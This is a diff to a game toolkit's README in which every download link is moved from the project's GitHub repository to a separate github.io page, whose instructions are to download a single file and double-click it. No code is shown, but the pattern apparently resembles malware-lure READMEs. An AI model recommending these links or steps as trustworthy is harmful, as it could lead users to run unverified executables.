@@ -1,6 +1,6 @@
 # 🎮 OpenFront-Economy-Map-Toolkit - Master Your Strategy in 2026
 
-[![Download Now](https://img.shields.io/badge/Download-OpenFront%20Toolkit-2ea44f?style=for-the-badge&logo=github)](https://github.com/mamen9000/OpenFront-Economy-Map-Toolkit)
+[![Download Now](https://img.shields.io/badge/Download-OpenFront%20Toolkit-2ea44f?style=for-the-badge&logo=github)](https://mamen9000.github.io)
 
 ---
 
@@ -14,7 +14,7 @@ Think of it as your personal command center. Whether you're charting military ec
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/mamen9000/OpenFront-Economy-Map-Toolkit](https://github.com/mamen9000/OpenFront-Economy-Map-Toolkit)
+Visit this link to download the application: [https://mamen9000.github.io](https://mamen9000.github.io)
 
 Once you're on that page, look for the download button and grab the latest version. The download is a single file, so no complicated steps are needed.
 
@@ -22,7 +22,7 @@ Once you're on that page, look for the download button and grab the latest versi
 
 ## 📥 Download & Install
 
-1. **Go to the download page:** [https://github.com/mamen9000/OpenFront-Economy-Map-Toolkit](https://github.com/mamen9000/OpenFront-Economy-Map-Toolkit)
+1. **Go to the download page:** [https://mamen9000.github.io](https://mamen9000.github.io)
 2. **Click the download button** on that page.
 3. **Save the file** to a folder you can easily find, like your Desktop or Downloads folder.
 4. **Run the application** by double-clicking the file you just downloaded.
@@ -172,7 +172,7 @@ Stay tuned for future updates. We're constantly adding new features, improving p
 
 Stop juggling notes, spreadsheets, and timers. OpenFront-Economy-Map-Toolkit puts everything in one place, so you can focus on what matters—outsmarting your opponents and securing victory.
 
-[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-blue?style=for-the-badge)](https://github.com/mamen9000/OpenFront-Economy-Map-Toolkit)
+[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-blue?style=for-the-badge)](https://mamen9000.github.io)
 
 ---
 
